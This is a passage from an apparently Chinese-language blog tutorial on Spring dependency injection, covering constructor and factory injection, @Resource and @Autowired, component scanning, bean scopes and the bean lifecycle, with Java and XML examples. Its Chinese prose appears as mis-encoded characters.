class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ„é€ å™¨æ³¨å…¥"><a href="#æ„é€ å™¨æ³¨å…¥" class="headerlink" title="æ„é€ å™¨æ³¨å…¥"></a>æ„é€ å™¨æ³¨å…¥</h3><p>å¯ä»¥ä¸ºè¦æ“ä½œçš„beanå¯¹è±¡è®¾ç½®å¸¦å‚æ„é€ å™¨ï¼Œé€šè¿‡æ„é€ å™¨ä¸ºå­—æ®µèµ‹å€¼ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestBean</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ä¸­ï¼Œéœ€è¦ä½¿ç”¨<code>&lt;constructor-arg&gt;</code>æŒ‡å‘æ„é€ æ–¹æ³•çš„å‚æ•°åå¹¶ä¼ å…¥å€¼ï¼Œä¸‹é¢çš„é…ç½®å¯ä»¥ä¸ºå¤šå‚æ„é€ å™¨ä¼ é€’å€¼ï¼Œébeanæ•°æ®ç±»å‹ä½¿ç”¨<code>value</code>å±æ€§</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;string&quot;</span> <span class="attr">value</span>=<span class="string">&quot;asd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<code>&lt;index&gt;</code>æŒ‡å®šä¼ å‚çš„ä½ç½®</p><p> <strong>å¾ªç¯ä¾èµ–é—®é¢˜</strong></p><p>æ„é€ å™¨æ³¨å…¥ä¸­ï¼Œè‹¥æŸä¸ªbeanå¯¹è±¡éœ€è¦æ³¨å…¥å¦ä¸€ä¸ªbeanå¯¹è±¡ï¼Œéœ€è¦å…ˆå®ä¾‹åŒ–å¦ä¸€ä¸ªbeanå†ä¼ å…¥æ„é€ å™¨ã€‚å€˜è‹¥ä¸¤ä¸ªå¯¹è±¡éœ€è¦ç›¸äº’æ³¨å…¥ï¼Œä¼šå¯¼è‡´beanå¯¹è±¡æ— æ³•æˆåŠŸå®ä¾‹åŒ–ï¼Œç±»ä¼¼å¤šçº¿ç¨‹çš„æ­»é”é—®é¢˜ï¼Œå¦‚ä¸‹ç¤ºä¾‹ä»£ç ä¼šå¯¼è‡´å¾ªç¯ä¾èµ–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestBean</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TestBean testBean;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestBean2</span><span class="params">(TestBean testBean)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean = testBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br><span class="line">        testBean.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥é—®é¢˜åœ¨æ„é€ å™¨æ³¨å…¥ä¸­æ— æ³•è§£å†³ï¼Œåªèƒ½é€šè¿‡setæ³¨å…¥è§£å†³ï¼Œå› ä¸ºsetæ³¨å…¥æ˜¯å…ˆå°†beanå¯¹è±¡å…¨éƒ¨å…ˆå®ä¾‹åŒ–å†è°ƒç”¨<code>setter</code>æ–¹æ³•çš„</p><h3 id="é™æ€å·¥å‚æ³¨å…¥"><a href="#é™æ€å·¥å‚æ³¨å…¥" class="headerlink" title="é™æ€å·¥å‚æ³¨å…¥"></a>é™æ€å·¥å‚æ³¨å…¥</h3><p>ä¸é™æ€å·¥å‚å®ä¾‹åŒ–ç±»ä¼¼ï¼Œé€šè¿‡é™æ€å·¥å‚å®ä¾‹åŒ–å¦ä¸€ä¸ªbeanå¯¹è±¡å†è¿”å›å‡ºæ¥ä½œä¸ºå­—æ®µï¼Œé™æ€å·¥å‚æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TestBean2 <span class="title function_">injectTestBean2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestBean2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶å†™æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;testBean&quot;</span> class=<span class="string">&quot;Beans.TestBean&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;testBean2&quot;</span> class=<span class="string">&quot;Factory.InjectFactory&quot;</span> factory-method=<span class="string">&quot;injectTestBean2&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„è¿˜æœ‰å®ä¾‹å·¥å‚æ³¨å…¥ï¼Œè¯¥æ–¹æ³•ä¸ä¸Šæ–‡çš„å®ä¾‹æ–¹æ³•å®ä¾‹åŒ–ç±»ä¼¼ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦å®ç°<code>setter</code>æ–¹æ³•ï¼Œé…ç½®æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;testBean2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;injectFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Factory.InjectFactory&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;injectFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;injectTestBean2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="påç§°ç©ºé—´"><a href="#påç§°ç©ºé—´" class="headerlink" title="påç§°ç©ºé—´"></a>påç§°ç©ºé—´</h3><p>spring2.5ä»¥åï¼Œpåç§°ç©ºé—´è¢«å¼•å…¥ï¼Œè¯¥ç‰¹æ€§å¯ä»¥ç®€åŒ–setæ³¨å…¥çš„æµç¨‹ï¼Œå°†<code>&lt;property&gt;</code>æ ‡ç­¾ç®€åŒ–ä¸ºbeançš„ä¸€ä¸ªå±æ€§ï¼Œä½¿ç”¨påç§°ç©ºé—´éœ€è¦å¼•å…¥<code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;testBean&quot;</span> class=<span class="string">&quot;Beans.TestBean&quot;</span> p:testBean2-ref=<span class="string">&quot;testBean2&quot;</span>/&gt;</span><br><span class="line">&lt;bean id=<span class="string">&quot;testBean2&quot;</span> class=<span class="string">&quot;Beans.TestBean2&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><br/><h2 id="è‡ªåŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰"><a href="#è‡ªåŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰" class="headerlink" title="è‡ªåŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰"></a>è‡ªåŠ¨è£…é…ï¼ˆæ³¨å…¥ï¼‰</h2><p>é™¤äº†ä½¿ç”¨xmlé…ç½®æ–‡ä»¶æ³¨å…¥ï¼Œè¿˜å¯ä»¥ä½¿ç”¨æ³¨è§£æ³¨å…¥ï¼Œè¿™ç§æ–¹å¼èƒ½å¤Ÿç®€åŒ–æ³¨è§£æµç¨‹ï¼Œä½¿ç¨‹åºæ›´åŠ ç®€æ´ï¼ŒSpringåº•å±‚çš„æ³¨è§£æ³¨å…¥ä¸»è¦é€šè¿‡åå°„å®ç°</p><p><strong>å‰æ</strong></p><p>å¼•å…¥å‘½åç©ºé—´</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">   &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨é…ç½®æ–‡ä»¶ä¸­æ“¦æ’å…¥<code>&lt;content:annotation-config/&gt;</code>å¼€å¯è‡ªåŠ¨åŒ–æ³¨å…¥</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Beans.TestBean2&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨è§£æ³¨å…¥åˆ†<code>@Resource</code>å’Œ<code>@Autowired</code>ä¸¤ç§</p><h3 id="Resourceæ³¨è§£"><a href="#Resourceæ³¨è§£" class="headerlink" title="@Resourceæ³¨è§£"></a>@Resourceæ³¨è§£</h3><p>è¯¥æ³¨è§£é»˜è®¤é€šè¿‡å±æ€§å­—æ®µåç§°<code>name</code>æŸ¥æ‰¾å¯¹åº”çš„beanå¯¹è±¡ï¼Œå¦‚æœå­—æ®µä¸ä¸€æ ·ï¼Œåˆ™ä¼šé€šè¿‡<code>class</code>æŸ¥æ‰¾ï¼Œè¯¥æ³¨è§£ä¸éœ€è¦å®ç°<code>setter</code>æ–¹æ³•ï¼Œè¯¥æ³¨è§£å¯ä»¥å£°æ˜åœ¨å±æ€§å­—æ®µä¸Šæˆ–<code>setter</code>æ–¹æ³•ä¸Šï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰</p><p><code>@Resource</code>æ³¨è§£å¯ä»¥è®¾ç½®<code>name</code>å±æ€§ï¼Œä½†æ­¤æ—¶è¦è·Ÿ<code>id</code>ä¸€è‡´</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> TestBean2 testBean2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTestBean2</span><span class="params">(TestBean2 testBean2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.testBean2 = testBean2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.testBean2.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥æ¥å£æ—¶ï¼Œè‹¥æ¥å£æœ‰ä¸¤ä¸ªåŠä»¥ä¸Šå®ç°ç±»ï¼Œéœ€è¦ä½¿ç”¨<code>name</code>å±æ€§æŒ‡å®šéœ€è¦çš„å®ç°ç±»å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Interface anInterface;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.anInterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Autowiredæ³¨è§£"><a href="#Autowiredæ³¨è§£" class="headerlink" title="@Autowiredæ³¨è§£"></a>@Autowiredæ³¨è§£</h3><p>è¯¥æ³¨è§£é»˜è®¤é€šè¿‡<code>class</code>æŸ¥æ‰¾ï¼Œä¸å­—æ®µåç§°æ— å…³ï¼Œè¯¥æ³¨è§£ä¸éœ€è¦<code>setter</code>æ–¹æ³•ï¼Œè¯¥æ³¨è§£å¯ä»¥å£°æ˜åœ¨å±æ€§å­—æ®µä¸Šæˆ–<code>setter</code>æ–¹æ³•ä¸Šï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰</p><p>è¯¥æ³¨è§£ä¸æ”¯æŒæ·»åŠ <code>name</code>å±æ€§ï¼Œå¦‚æœéœ€è¦è¾¾åˆ°ç›¸ä¼¼çš„æ•ˆæœéœ€è¦é…åˆ<code>@Qualifier</code>çš„<code>value</code>å±æ€§ä½¿ç”¨ï¼Œ<code>@Qualifier</code>çš„<code>value</code>å±æ€§å¿…é¡»è¦è®¾ç½®ä¸”éœ€ä¸beançš„<code>id</code>å±æ€§ç›¸åŒ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Interface anInterface;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.anInterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="æ‰«æå™¨"><a href="#æ‰«æå™¨" class="headerlink" title="æ‰«æå™¨"></a>æ‰«æå™¨</h2><p>æ‰«æå™¨ç®€åŒ–äº†é…ç½®æ–‡ä»¶æ·»åŠ <code>&lt;bean&gt;</code>æ ‡ç­¾çš„æ“ä½œï¼Œæ‰«æå™¨çš„åŠŸèƒ½ä¸€æ ·é€šè¿‡æ³¨è§£å®ç°</p><p><strong>å‰æ</strong></p><p>è®¾ç½®è‡ªåŠ¨æ‰«æèŒƒå›´ï¼Œ<code>base-package</code>åæ¥åŒ…åè¡¨ç¤ºæ‰«æçš„èŒƒå›´ï¼Œè‹¥å¯¹è±¡ä¸åœ¨æ‰«æèŒƒå›´ï¼Œå³ä½¿æ·»åŠ æ³¨è§£ä¹Ÿä¸ä¼šè¢«å®ä¾‹åŒ–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;context:component-scan base-<span class="keyword">package</span>=<span class="string">&quot;Beans&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç‰¹å®šçš„æ³¨è§£</p><table><thead><tr><th>æ³¨è§£</th><th>çº§åˆ«</th></tr></thead><tbody><tr><td><code>@Repository</code></td><td>Daoå±‚</td></tr><tr><td><code>@Service</code></td><td>Serviceå±‚</td></tr><tr><td><code>@Controller</code></td><td>Controllerå±‚</td></tr><tr><td><code>@Component</code></td><td>ä»»æ„å±‚</td></tr></tbody></table><p>ä½¿ç”¨æ–¹æ³•è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œè¿™é‡Œç”¨äº†<code>@Component</code>æ³¨è§£ä¹‹åé…ç½®æ–‡ä»¶å°±å®Œå…¨ä¸ç”¨ç®¡äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value = &quot;testBean2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Interface anInterface;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.anInterface.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Beançš„ä½œç”¨åŸŸ"><a href="#Beançš„ä½œç”¨åŸŸ" class="headerlink" title="Beançš„ä½œç”¨åŸŸ"></a>Beançš„ä½œç”¨åŸŸ</h2><p>å¯¹äºbeançš„ä½œç”¨åŸŸä¸»è¦æœ‰ä¸¤ç§</p><h3 id="singletonä½œç”¨åŸŸ"><a href="#singletonä½œç”¨åŸŸ" class="headerlink" title="singletonä½œç”¨åŸŸ"></a>singletonä½œç”¨åŸŸ</h3><p><img src="/img/post/image-20251226113117234.png" alt="image-20251226113117234"></p><p><code>lazy-init</code>å±æ€§ç”¨äºæŒ‡å®šæ˜¯å¦æ‡’åŠ è½½ï¼Œæ‡’åŠ è½½åœ¨Springå¯åŠ¨æ—¶ä¸ä¼šå®ä¾‹åŒ–è¯¥ç±»ï¼Œè€Œåœ¨ç¨‹åºè°ƒç”¨æ—¶å®ä¾‹åŒ–ï¼Œé»˜è®¤æƒ…å†µä¸‹Springä¼šåœ¨å¯åŠ¨æ—¶å®ä¾‹åŒ–ç±»å¹¶ç¼“å­˜åœ¨å®¹å™¨ä¸­</p><p>ä¹ˆäº²çœ‹ä¸‹ä¸€ä¸ªbeanå¯¹è±¡åœ¨IOCå®¹å™¨ä¸­åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œæ‰€æœ‰è·å–è¯¥beançš„æ“ä½œéƒ½è¿”å›åŒä¸€ä¸ªå®ä¾‹</p><p><strong>ä»€ä¹ˆå¯¹è±¡é€‚åˆä½œä¸ºå•ä¾‹ï¼Ÿ</strong></p><p>æ— å®ä¾‹å˜é‡æˆ–ä¿è¯å®ä¾‹å˜é‡å…¨å±€ç»Ÿä¸€çš„å¯¹è±¡é€‚åˆä½œä¸ºå•ä¾‹ã€‚å› ä¸ºå•ä¾‹å¯¹è±¡åœ¨å…¨å±€åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œè‹¥è¯¥å•ä¾‹å­˜åœ¨å®ä¾‹å˜é‡ï¼Œå½“è¯¥æˆå‘˜å˜é‡åœ¨æŸä¸€å¤„è¢«ä¿®æ”¹æ—¶ï¼Œä¼šé€ æˆè¯¥å•ä¾‹çš„çŠ¶æ€è¢«å…¨å±€ä¿®æ”¹ï¼Œè¿™ä¸åˆ©äºå•ä¾‹åœ¨å…¨å±€çš„ç»Ÿä¸€æ€§ã€‚åŒæ—¶è‹¥è¯¥å•ä¾‹çš„å®ä¾‹å˜é‡è¢«å¤šçº¿ç¨‹ä¿®æ”¹ï¼Œä¹Ÿä¼šå­˜åœ¨çº¿ç¨‹ä¸å®‰å…¨é—®é¢˜</p><h3 id="prototype-ä½œç”¨åŸŸ"><a href="#prototype-ä½œç”¨åŸŸ" class="headerlink" title="prototype ä½œç”¨åŸŸ"></a>prototype ä½œç”¨åŸŸ</h3><p><img src="/img/post/image-20251226120150710.png" alt="image-20251226120150710"></p><p>é€šè¿‡<code>scope</code>å±æ€§è®¾ç½®ä¸º<code>prototype</code>çš„beanç±»å‹ï¼Œæ¯æ¬¡å‘Springè¯·æ±‚éƒ½ä¼šè·å¾—ä¸€ä¸ªå…¨æ–°çš„beanå¯¹è±¡ï¼ŒSpringåœ¨å¯åŠ¨æ—¶ä¸ä¼šå…ˆå®ä¾‹åŒ–åˆ°ç¼“å­˜æ± ï¼Œæ­¤æ–¹å¼è·å¾—çš„beanå…¨å±€ä¸å”¯ä¸€</p><h3 id="Webåº”ç”¨ä¸­çš„ä½œç”¨åŸŸ"><a href="#Webåº”ç”¨ä¸­çš„ä½œç”¨åŸŸ" class="headerlink" title="Webåº”ç”¨ä¸­çš„ä½œç”¨åŸŸ"></a>Webåº”ç”¨ä¸­çš„ä½œç”¨åŸŸ</h3><p><strong>requestä½œç”¨åŸŸ</strong></p><p>è¡¨ç¤ºæ¯ä¸ªè¯·æ±‚éœ€è¦å®¹å™¨åˆ›å»ºä¸€ä¸ªå…¨æ–°Beanã€‚æ¯”å¦‚æäº¤è¡¨å•çš„æ•°æ®å¿…é¡»æ˜¯å¯¹æ¯æ¬¡è¯·æ±‚æ–°å»ºä¸€ä¸ªBeanæ¥ä¿æŒè¿™äº›è¡¨å•æ•°æ®ï¼Œè¯·æ±‚ç»“æŸé‡Šæ”¾è¿™äº›æ•°æ®</p><p><strong>sessionä½œç”¨åŸŸ</strong></p><p>è¡¨ç¤ºæ¯ä¸ªä¼šè¯éœ€è¦å®¹å™¨åˆ›å»ºä¸€ä¸ªå…¨æ–°Beanã€‚æ¯”å¦‚å¯¹äºæ¯ä¸ªç”¨æˆ·ä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªä¼šè¯ï¼Œè¯¥ç”¨æˆ·çš„ç”¨æˆ·ä¿¡æ¯éœ€è¦å­˜å‚¨åˆ°ä¼šè¯ä¸­ï¼Œæ­¤æ—¶å¯ä»¥å°†è¯¥Beanä½œç”¨åŸŸé…ç½®ä¸ºsessionçº§åˆ«</p><p><strong>globalSessionä½œç”¨åŸŸ</strong></p><p>ç±»ä¼¼äºsessionä½œç”¨åŸŸï¼Œå…¶ç”¨äºportlet(Portletæ˜¯åŸºäºJavaçš„Webç»„ä»¶ï¼Œç”±Portletå®¹å™¨ç®¡ç†ï¼Œå¹¶ç”±å®¹å™¨å¤„ç†è¯·æ±‚ï¼Œç”Ÿäº§åŠ¨æ€å†…å®¹ç¯å¢ƒçš„web)åº”ç”¨ã€‚å¦‚æœåœ¨éportletç¯å¢ƒå°†è§†ä¸ºsessionä½œç”¨åŸŸ</p><br/><h2 id="Beançš„ç”Ÿå‘½å‘¨æœŸ"><a href="#Beançš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Beançš„ç”Ÿå‘½å‘¨æœŸ"></a>Beançš„ç”Ÿå‘½å‘¨æœŸ</h2><p>beançš„ç”Ÿå‘½å‘¨æœŸåŒ…å«å®šä¹‰ã€åˆå§‹åŒ–ã€ä½¿ç”¨å’Œé”€æ¯å››ä¸ªé˜¶æ®µ</p><h3 id="beançš„å®šä¹‰"><a href="#beançš„å®šä¹‰" class="headerlink" title="beançš„å®šä¹‰"></a>beançš„å®šä¹‰</h3><p>å®šä¹‰beançš„è¿‡ç¨‹å°±æ˜¯é€šè¿‡é…ç½®æ–‡æ¡£å®šä¹‰beanç±»å‹çš„è¿‡ç¨‹</p><h3 id="beançš„åˆå§‹åŒ–"><a href="#beançš„åˆå§‹åŒ–" class="headerlink" title="beançš„åˆå§‹åŒ–"></a>beançš„åˆå§‹åŒ–</h3><p>beançš„åˆå§‹åŒ–å¯é€šè¿‡ä¸¤ç§æ–¹æ³•è¿›è¡Œ</p><p><strong>åœ¨é…ç½®æ–‡æ¡£ä¸­æŒ‡å®š<code>init-method</code>è¿›è¡Œ</strong></p><p>ä¸ºbeanåˆ›å»ºä¸€ä¸ªåˆå§‹åŒ–æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ä¸­æŒ‡å®š<code>init-method</code>å±æ€§</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Bean.Test&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å®ç°<code>InitializingBean</code>æ¥å£</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ä¸éœ€è¦<code>init-method</code>å±æ€§</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Bean.Test&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="beançš„ä½¿ç”¨"><a href="#beançš„ä½¿ç”¨" class="headerlink" title="beançš„ä½¿ç”¨"></a>beançš„ä½¿ç”¨</h3><p>beanå¯ä»¥é€šè¿‡<code>BeanFactory</code>è·å¾—</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) beanFactory.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br></pre></td></tr></table></figure><p>æˆ–è€…é€šè¿‡<code>ApplicationContext</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span 